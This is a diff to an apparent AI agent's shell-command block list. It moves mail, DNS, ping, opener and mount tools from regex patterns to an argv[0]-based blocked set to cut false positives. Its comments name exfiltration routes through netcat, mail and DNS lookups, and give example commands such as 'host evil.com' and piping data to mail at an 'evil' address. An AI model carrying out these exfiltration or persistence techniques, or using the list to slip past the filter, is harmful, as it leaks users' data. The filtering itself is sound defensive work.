@@ -62,9 +62,9 @@ export const BLOCKED_COMMANDS = [
   /\bwebsocat\s/i,                          // websocat (network-only WebSocket client)
   /\bnc\.traditional\s/i,                   // Debian netcat-traditional (the bare `\bnc\s` misses the dotted name)
   /\bsendmail\s/i,                          // sendmail (relay mail to arbitrary dest)
-  /\bmail\s/i,                              // mail (relay mail to arbitrary dest)
-  /\bmailx\s/i,                             // mailx (relay mail to arbitrary dest)
   /\bssmtp\s/i,                             // ssmtp (relay mail to arbitrary dest)
+  // NOTE: `mail`/`mailx` moved to DANGEROUS_INVOKE_BINS (argv[0] check) — the
+  // bare `\bword\s` form false-positived on arguments (`send mail to …`).
   /\bopenssl\s+s_(client|server)\b/i,       // openssl s_client/s_server ONLY (raw TLS pipe); bare openssl dgst/x509/enc/genrsa stay allowed
   // `fetch`, `http`, `https`, `xh`, `httpie`, `curlie` are deliberately NOT
   // listed here as `\bword\s` patterns: that would false-positive on
@@ -76,15 +76,13 @@ export const BLOCKED_COMMANDS = [
   // browser-launch-as-exfil, AppleScript-wrapped shell). `\bword\s` requires
   // the binary be immediately followed by whitespace, so `open ` matches but
   // `openssl `/`/usr/bin/openfoo` do not.
-  /\bdig\s/i,                               // DNS lookup (data-in-subdomain exfil)
-  /\bhost\s/i,                              // DNS lookup
-  /\bnslookup\s/i,                          // DNS lookup
-  /\bgetent\s/i,                            // NSS lookup (hosts → DNS)
-  /\bping\s/i,                              // ICMP (data-in-hostname exfil)
-  /\btraceroute\s/i,                        // route probe (egress)
   /\bosascript\s/i,                         // macOS AppleScript (wraps `do shell script`)
-  /\bopen\s/i,                              // macOS opener (launches browser/app w/ URL)
   /\bxdg-open\s/i,                          // Linux opener (launches browser/app w/ URL)
+  // NOTE: dig/host/nslookup/getent/ping/traceroute/open moved to
+  // DANGEROUS_INVOKE_BINS (argv[0] check). As bare `\bword\s` substrings they
+  // false-positived on benign arguments (`grep host /etc/hosts`, `… | grep
+  // open`, `echo "ping the box"`). The danger is INVOKING them, which the
+  // argv[0]-basename scan captures precisely without the false blocks.
   // ── macOS persistence / automation primitives (C3-12/C3-14) ──
   // These install background jobs or run script-as-shell, an RCE/persistence
   // path that needs no metacharacters. `launchctl submit -l x -- /bin/sh -c
@@ -139,9 +137,26 @@ export const BLOCKED_COMMANDS = [
   // ── Disk/partition manipulation ──
   /\bfdisk\b/i,                              // Partition table editor
   /\bparted\b/i,                             // Partition editor
-  /\bmount\s+/i,                             // Mount filesystems
-  /\bumount\s+/i,                            // Unmount filesystems
+  // mount/umount moved to DANGEROUS_INVOKE_BINS (argv[0]) — `\bmount\s`
+  // false-positived on `… | grep mount` and `echo mounting`.
 ];
+
+// ── argv[0] dangerous-command basenames ──
+// Network/DNS/opener/disk binaries that are dangerous when INVOKED, but whose
+// bare names are common English/argument words. Matching them as substrings
+// (the old `\bopen\s`/`\bhost\s`/`\bping\s` BLOCKED_COMMANDS entries) blocked
+// benign commands like `grep host /etc/hosts` or `… | grep open`. They are now
+// detected by the argv[0] basename of each pipe segment (detectDangerousInvokeBin),
+// the same structural approach as NETWORK_CLIENT_BINS: `grep host` (host as an
+// argument) passes; `host evil.com` / `cat x | mail a@evil` (the binary as the
+// invoked command) is blocked. The rarer-word network clients (curl/wget/nc/…)
+// deliberately stay as substring patterns above — they almost never appear as a
+// benign argument, so the broader match is extra coverage, not a false-positive
+// source.
+export const DANGEROUS_INVOKE_BINS = new Set([
+  "open", "host", "ping", "mount", "umount",
+  "mail", "mailx", "dig", "nslookup", "getent", "traceroute",
+]);
 
 // Commands that hand a URL to the system browser / an external app. Rejected
 // with a specific "use the browser tool instead" message (which has CDP
